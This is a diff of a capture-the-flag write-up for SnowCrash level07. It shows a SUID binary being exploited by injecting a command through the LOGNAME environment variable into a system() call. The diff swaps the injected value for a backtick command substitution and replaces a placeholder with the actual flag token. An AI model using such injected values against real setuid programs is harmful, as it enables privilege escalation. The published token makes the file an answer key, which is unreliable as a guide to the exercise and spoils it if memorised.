@@ -1,17 +1,3 @@
-# SnowCrash — Flag07 Writeup
-
-> **Machine:** SnowCrash (École 42)
-> **Level:** level07 → flag07
-> **Vulnerability:** Environment Variable Injection via unsanitized `system()` call
-
----
-
-## Context
-
-In this challenge, we are logged in as `level07` and must retrieve the flag belonging to `flag07`. A binary executable is available in the home directory, but we cannot simply read the flag file directly — we need to exploit the binary itself.
-
----
-
 ## Step 1 — Discovering the Binary
 
 Upon logging in as `level07`, we find an executable in the home directory. Checking its permissions reveals something critical:
@@ -23,7 +9,7 @@ ls -la level07
 The binary has the **SUID bit set** (`rws`) for the user `flag07`:
 
 ```
--rwsr-sr-x 1 flag07 level07 ... level07
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
 ```
 
 This means: **when this binary is executed, it runs with the privileges of `flag07`**, not `level07`. This is the gateway to obtaining the flag — if we can make this binary execute `getflag` on our behalf, we win.
@@ -87,14 +73,14 @@ Wait — that would just print the word `getflag`. We need to **break out of the
 ### The Exploit
 
 ```bash
-export LOGNAME="; getflag"
+export LOGNAME='`getflag`'
 ./level07
 ```
 
 The constructed command becomes:
 
 ```bash
-/bin/echo ; getflag
+/bin/echo `getflag`
 ```
 
 Since the binary runs as `flag07` (thanks to SUID), `getflag` is executed with `flag07`'s privileges and prints the flag. 
@@ -104,7 +90,7 @@ Since the binary runs as `flag07` (thanks to SUID), `getflag` is executed with `
 ## Result
 
 ```
-Check flag.Here is your token: <FLAG>
+Check flag.Here is your token: fiumuikeil55xe9cu4dood66h
 ```
 
 ---
